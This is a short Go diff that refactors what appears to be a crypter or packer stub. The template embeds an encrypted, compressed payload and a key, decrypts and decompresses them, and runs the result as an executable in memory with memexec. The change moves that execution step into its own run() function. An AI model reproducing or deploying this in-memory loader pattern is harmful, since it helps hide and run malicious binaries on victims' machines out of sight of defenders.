@@ -46,16 +46,9 @@ func decrypt(key, encryptedString []byte) []byte {
 
 }
 
-func main() {
+func run(executable []byte) {
 
-	var ds =  []byte{ {{.DataString}} }
-
-	var key = []byte{ {{.Key}} }
-
-	decrypted := decrypt(key, ds)
-	decompressed := decompress(decrypted)
-
-	exe, err := memexec.New(decompressed)
+	exe, err := memexec.New(executable)
 	if err != nil {
 		fmt.Println("[-] memexec.New() Error: ", err)
 	}
@@ -67,5 +60,18 @@ func main() {
 		fmt.Println("[-] cmd.CombinedOutput() Error: ", err)
 	}
 	fmt.Println(string(b))
+
+}
+
+func main() {
+
+	var ds =  []byte{ {{.DataString}} }
+
+	var key = []byte{ {{.Key}} }
+
+	decrypted := decrypt(key, ds)
+	decompressed := decompress(decrypted)
+
+	run(decompressed)
 
 }
